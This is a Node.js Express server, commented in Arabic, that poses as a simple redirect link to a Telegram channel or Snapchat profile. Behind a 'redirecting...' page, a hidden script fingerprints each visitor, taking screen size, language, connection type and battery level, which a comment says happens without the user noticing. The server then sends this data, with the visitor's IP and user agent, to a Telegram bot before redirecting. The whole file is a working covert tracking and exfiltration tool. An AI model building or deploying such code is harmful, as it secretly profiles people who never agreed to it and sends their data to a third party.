const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', async (req, res) => {
    // 1. استخراج المتغير والـ IP الأساسي
    const destination = req.query.to;
    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // 2. الروابط
    const telegramUrl = "https://t.me/uUl8iPwh5iYTVk";
    const snapUrl = "https://www.snapchat.com/add/rossan2682";
    let targetUrl = telegramUrl; 

    if (destination === 'snap') {
        targetUrl = snapUrl;
    }

    // [تعديل ذكي]: إذا كانت البيانات المتقدمة قادمة من المتصفح عبر رابط التحويل الداخلي
    if (req.query.res) {
        try {
            const token = process.env.TELEGRAM_TOKEN;
            const chatId = process.env.TELEGRAM_CHAT_ID;
            
            // تجميع رسالة تليجرام الشاملة لجميع البيانات المطلوبة
            const fullMessage = `🚨 New Visitor Details!\n` +
                                `📍 IP: ${visitorIp}\n` +
                                `🎯 Target: ${destination || 'Telegram'}\n` +
                                `📱 Device (UA): ${req.headers['user-agent']}\n` +
                                `🖥️ Resolution: ${req.query.res}\n` +
                                `🌐 Language: ${req.query.lang}\n` +
                                `🔋 Battery: ${req.query.bat}\n` +
                                `⚡ Connection: ${req.query.conn}`;
            
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: fullMessage })
            });
        } catch (err) {
            console.log("Telegram Error: ", err);
        }

        // التوجيه النهائي للرابط المقصود بعد تسجيل البيانات الشاملة
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <script>
                    window.location.href = "${targetUrl}";
                </script>
            </head>
            <body>
                <p style="text-align: center; margin-top: 50px;">جاري التحويل للوجهة النهائية...</p>
            </body>
            </html>
        `);
    }

    // 4. المرحلة الأولى: عرض صفحة خفيفة تجمع بصمة المتصفح (Fingerprinting) بدون أن يشعر المستخدم
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
        </head>
        <body>
            <p style="text-align: center; margin-top: 50px;">جاري التحويل...</p>
            <script>
                async function collectAndForward() {
                    // جمع أبعاد الشاشة، لغة الجهاز، ونوع الاتصال
                    const screenRes = window.screen.width + 'x' + window.screen.height;
                    const language = navigator.language || navigator.userLanguage;
                    const connection = navigator.connection ? navigator.connection.effectiveType : 'unknown';
                    
                    // جمع حالة البطارية إذا كان المتصفح يدعمها
                    let batteryStatus = 'unknown';
                    if (navigator.getBattery) {
                        try {
                            const battery = await navigator.getBattery();
                            batteryStatus = Math.round(battery.level * 100) + '%';
                        } catch (e) {
                            batteryStatus = 'restricted';
                        }
                    }
                    
                    // إعادة توجيه الطلب لنفس السيرفر مع إرسال البيانات المجمعة عبر الـ Query Params
                    const currentParams = new URLSearchParams(window.location.search);
                    const toParam = currentParams.get('to') || '';
                    
                    window.location.href = '/?res=' + encodeURIComponent(screenRes) + 
                                           '&lang=' + encodeURIComponent(language) + 
                                           '&conn=' + encodeURIComponent(connection) + 
                                           '&bat=' + encodeURIComponent(batteryStatus) + 
                                           '&to=' + encodeURIComponent(toParam);
                }
                collectAndForward();
            </script>
        </body>
        </html>
    `);
});

module.exports = app;
app.listen(PORT, () => console.log("Server is running..."));
